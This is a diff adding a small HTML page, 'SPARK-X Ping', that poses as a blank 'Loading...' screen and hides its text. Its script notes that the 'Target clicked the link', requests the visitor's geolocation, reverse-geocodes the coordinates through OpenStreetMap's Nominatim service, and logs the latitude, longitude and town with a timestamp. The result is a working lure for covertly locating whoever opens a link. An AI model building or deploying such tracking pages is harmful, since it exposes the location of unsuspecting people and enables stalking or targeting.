@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>SPARK-X Ping</title>
+  <style>
+    body {
+      background-color: #0f0f0f;
+      color: #0f0f0f; /* Invisible text */
+      font-family: monospace;
+      text-align: center;
+      padding-top: 50px;
+    }
+  </style>
+</head>
+<body>
+  <p>Loading...</p>
+
+  <script>
+    console.log("🔔 Target clicked the link at " + new Date().toISOString());
+
+    navigator.geolocation.getCurrentPosition(async position => {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      try {
+        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+        const data = await response.json();
+        const place = data.address.suburb || data.address.village || data.address.town || data.address.city || "Unknown";
+
+        const log = {
+          clicked: true,
+          latitude: lat,
+          longitude: lon,
+          area: place,
+          timestamp: new Date().toISOString()
+        };
+
+        console.log("📍 Location Log:", log);
+      } catch (err) {
+        console.error("Geocoding error:", err);
+      }
+    }, error => {
+      console.error("Location error:", error);
+    });
+  </script>
+</body>
+</html>
